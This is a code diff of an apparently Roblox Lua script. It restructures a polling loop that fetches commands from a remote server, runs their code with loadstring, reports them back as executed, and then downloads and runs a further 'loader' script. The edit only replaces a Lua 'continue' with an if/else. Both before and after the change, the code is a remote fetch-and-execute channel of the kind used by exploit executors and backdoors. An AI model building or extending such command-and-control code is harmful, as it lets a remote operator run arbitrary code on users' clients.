@@ -77,57 +77,55 @@ while true do
                     -- Skip if already executed in this session
                     if executedThisSession[cmd.name] then
                         print("[EXECUTE] Skipping already executed command:", cmd.name)
-                        continue
-                    end
-                    
-                    print("[EXECUTE] Executing command:", cmd.name)
-                    
-                    -- Mark as executed in this session
-                    executedThisSession[cmd.name] = true
-                    
-                    -- Execute the main script
-                    local execSuccess, execErr = pcall(function()
-                        loadstring(cmd.code)()
-                    end)
-                    
-                    if execSuccess then
-                        print("[EXECUTE] Main script executed successfully")
                     else
-                        warn("[EXECUTE] Main script failed:", execErr)
-                    end
-                    
-                    -- Try to delete command from server
-                    pcall(function()
-                        httpPost(SERVER_URL .. "/api/commands/" .. cmd.name .. "/executed", "")
-                    end)
-                    
-                    -- After main script, load and execute loader script
-                    print("[LOADER] Fetching loader script...")
-                    local loaderResponse = httpGet(SERVER_URL .. "/api/loader")
-                    
-                    if loaderResponse then
-                        local loaderSuccess, loaderData = pcall(function()
-                            return game:GetService("HttpService"):JSONDecode(loaderResponse)
+                        print("[EXECUTE] Executing command:", cmd.name)
+                        
+                        -- Mark as executed in this session
+                        executedThisSession[cmd.name] = true
+                        
+                        -- Execute the main script
+                        local execSuccess, execErr = pcall(function()
+                            loadstring(cmd.code)()
                         end)
                         
-                        if loaderSuccess and loaderData.success and loaderData.code then
-                            print("[LOADER] Executing loader script...")
-                            local loadSuccess, loadErr = pcall(function()
-                                loadstring(loaderData.code)()
+                        if execSuccess then
+                            print("[EXECUTE] Main script executed successfully")
+                        else
+                            warn("[EXECUTE] Main script failed:", execErr)
+                        end
+                        
+                        -- Try to delete command from server
+                        pcall(function()
+                            httpPost(SERVER_URL .. "/api/commands/" .. cmd.name .. "/executed", "")
+                        end)
+                        
+                        -- After main script, load and execute loader script
+                        print("[LOADER] Fetching loader script...")
+                        local loaderResponse = httpGet(SERVER_URL .. "/api/loader")
+                        
+                        if loaderResponse then
+                            local loaderSuccess, loaderData = pcall(function()
+                                return game:GetService("HttpService"):JSONDecode(loaderResponse)
                             end)
                             
-                            if loadSuccess then
-                                print("[LOADER] Loader script executed successfully")
+                            if loaderSuccess and loaderData.success and loaderData.code then
+                                print("[LOADER] Executing loader script...")
+                                local loadSuccess, loadErr = pcall(function()
+                                    loadstring(loaderData.code)()
+                                end)
+                                
+                                if loadSuccess then
+                                    print("[LOADER] Loader script executed successfully")
+                                else
+                                    warn("[LOADER] Loader script failed:", loadErr)
+                                end
                             else
-                                warn("[LOADER] Loader script failed:", loadErr)
+                                warn("[LOADER] Failed to decode loader response")
                             end
                         else
-                            warn("[LOADER] Failed to decode loader response")
+                            warn("[LOADER] Failed to fetch loader script")
                         end
-                    else
-                        warn("[LOADER] Failed to fetch loader script")
                     end
-                end
             end
         else
             warn("[POLL] Failed to decode response")
